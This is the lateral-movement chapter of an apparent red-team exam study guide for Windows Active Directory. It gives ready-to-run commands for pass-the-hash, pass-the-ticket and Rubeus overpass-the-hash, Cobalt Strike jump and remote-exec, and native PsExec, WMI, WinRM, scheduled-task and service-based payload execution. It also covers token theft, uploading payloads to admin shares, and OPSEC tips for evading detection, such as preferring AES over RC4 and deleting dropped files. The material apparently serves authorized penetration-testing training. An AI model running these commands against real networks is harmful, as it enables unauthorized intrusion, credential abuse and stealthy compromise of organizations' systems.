## 9. Lateral movement

Lateral movement is where most candidates lose time and OPSEC points. The goal is not "use every technique" — it is "reach the next host with the least noise that works."

### 9.1 Preconditions

Before moving, confirm:

| Requirement | Check |
|---|---|
| Credential or token valid on the target | `make_token`, `pth`, `ptt`, or a stolen token |
| Administrative access on the target | Local admin, or a service account with rights |
| Network path to the target | `portscan <host> 445,5985,3389`, `Test-NetConnection` |
| Name resolution | Kerberos needs the **FQDN**, not an IP; check DNS |
| Target OS/architecture | `Get-DomainComputer`, `nslookup`, `systeminfo` via a session |

**Rule:** a credential that works on one host does not automatically work on another. Local admin reuse is common but not universal. Verify before you spray a technique across a subnet.

### 9.2 Credential use: PTH, PTT, overpass-the-hash

```text
# Pass-the-hash (NTLM)
pth <DOMAIN>\<user> <ntlm-hash>
pth <DOMAIN>\<user> <ntlm-hash> <listener>     # spawn a session in the new context
rev2self

# Make a netonly token from a password
make_token <DOMAIN>\<user> <password>
rev2self

# Steal an existing token
steal_token <pid>
token-store steal <pid>
token-store show
token-store use <id>
rev2self

# Pass-the-ticket
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:<base64>

# Overpass-the-hash → TGT → use it
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:<user> /rc4:<hash> /domain:<domain> /dc:<dc> /opsec /nowrap
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:<user> /aes256:<key> /domain:<domain> /dc:<dc> /opsec /nowrap
```

**Which to use**

| Situation | Use | Why |
|---|---|---|
| Have NTLM hash, target accepts NTLM | `pth` | Simple, but 4624 type 3 + 4776 |
| Have AES key / password, Kerberos possible | `asktgt` → `ptt` | AES is less anomalous than RC4 |
| Have a ticket already | `ptt` | No new credential validation |
| Have a process token | `steal_token` | No credential material needed |

**OPSEC:** pass-the-hash is detectable as NTLM network logons from a user who should use Kerberos. Prefer Kerberos (AES) where the environment allows it.

### 9.3 Cobalt Strike: `jump` and `remote-exec`

`jump` starts a **new session** on the target. `remote-exec` runs a **command** on the target using an existing session's context.

```text
# New session via PsExec (service-based)
jump psexec64 <target-fqdn> <listener>
jump psexec_psh <target-fqdn> <listener>

# New session via WinRM
jump winrm64 <target-fqdn> <listener>

# New session via SSH (if configured)
jump ssh <target> <listener>

# Run a command remotely (no new session)
remote-exec psexec <target> C:\Windows\Temp\payload.exe
remote-exec winrm  <target> powershell.exe -nop -w hidden -c "C:\Windows\Temp\payload.exe"

# Connect to an existing SMB/TCP beacon
link <target-fqdn> <pipe-name>
connect <target> <port>
unlink
```

**Choose the jump method by target tier:**

| Method | Creates service | Writes binary | Logon type | Best for |
|---|---|---|---|---|
| `psexec64` | ✅ | ✅ | 3 | Quick, Tier-2 hosts |
| `psexec_psh` | ✅ | PowerShell | 3 | When exe is blocked |
| `winrm64` | ❌ | ❌ (in-memory-ish) | 3 + WSMan | Servers with WinRM; quieter than PsExec |
| WMI (`remote-exec wmi`) | ❌ | ❌ | 3 | When WinRM is blocked; WMI logs |
| SMB `link` | ❌ | ❌ | — | Peer-to-peer pivoting from an existing host |
| DCOM | ❌ | varies | 3 | Fallback when others fail |

> **OPSEC detail from the official docs:** `jump psexec`, `jump psexec64`, `elevate svc-exe`, and `remote-exec psexec` create/configure a service through Win32 APIs and drop a Service EXE that spawns `rundll32.exe` with **no arguments**, injects, and exits. A `rundll32.exe` with an empty command line is a strong detection signature. Use `ak-settings` (Artifact Kit) to set an explicit spawn-to path — the profile's `post-ex.spawnto` cannot use environment variables like `%windir%` in SYSTEM context. `jump psexec_psh` and `remote-exec psexec` are BOF-based and do not drop that service EXE.
>
> `remote-exec` returns **no output**; upload a payload, redirect output to a file, or use a session (`jump`) when you need to see results. `wmi` is a `remote-exec` module, not a `jump` module.

### 9.4 Native lateral movement

```text
# PsExec (Sysinternals)
PsExec.exe \\<target> -u <DOMAIN>\<user> -p <password> cmd.exe
PsExec.exe \\<target> -s cmd.exe

# WMI
wmic /node:<target> /user:<DOMAIN>\<user> /password:<password> process call create "cmd.exe /c whoami"
Invoke-WmiMethod -ComputerName <target> -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami"

# WinRM / PowerShell Remoting
winrs -r:<target> cmd.exe
Enter-PSSession -ComputerName <target> -Credential <cred>
Invoke-Command -ComputerName <target> -ScriptBlock { whoami }

# Scheduled task
schtasks /s <target> /create /tn "Updater" /tr "C:\Windows\Temp\payload.exe" /sc once /st 00:00 /ru SYSTEM
schtasks /s <target> /run /tn "Updater"

# Service
sc \\<target> create Updater binPath= "C:\Windows\Temp\payload.exe" start= auto
sc \\<target> start Updater
```

**OPSEC:** every one of these is visible. PsExec is the loudest (service + binary + 7045). WinRM is usually quieter but requires the service and generates WSMan logs. WMI creates a process under `WmiPrvSE.exe` and is logged.

### 9.5 Admin shares and file access

```text
ls \\<target>\c$
ls \\<target>\admin$
download \\<target>\c$\Users\<user>\Desktop\file.txt
upload C:\Tools\payload.exe \\<target>\c$\Windows\Temp\payload.exe
```

**OPSEC:** SMB access is logged (5140/5145 if enabled) and file creation on the target is visible. Delete copied files.

### 9.6 Method selection cheat sheet

| Constraint | First choice | Fallback |
|---|---|---|
| WinRM enabled and you are admin | `jump winrm64` | WMI |
| Only SMB reachable | `jump psexec64` (accept noise) | `link` to an SMB beacon |
| AV blocks exe on disk | `jump psexec_psh` / `jump winrm64` | WMI with an in-memory payload |
| Target is Tier 0 / restricted | `link` to an existing session, or a very quiet WinRM beacon | Do not use PsExec |
| No admin, but local admin reuse | PTH + `jump` | Token theft |
| Kerberos-only environment | `asktgt` / `ptt` + WinRM/SMB | Do not rely on NTLM |

### 9.7 Troubleshooting

| Symptom | Cause | Fix |
|---|---|---|
| `jump` fails "could not connect" | SMB/WinRM blocked or wrong FQDN | `portscan`; use FQDN; check firewall |
| Session dies immediately | Payload blocked/quarantined | Try a different listener or `psexec_psh` |
| `STATUS_LOGON_FAILURE` | Bad hash/ticket, or NTLM disabled | Try AES/`asktgt`; verify domain |
| Access denied on `c$` | Not local admin | `Find-LocalAdminAccess`; token theft |
| WinRM 5985 open but auth fails | Not in Remote Management Users | Use WMI or PsExec |
| Kerberos errors with IP | SPN mismatch | Use the FQDN, not the IP |

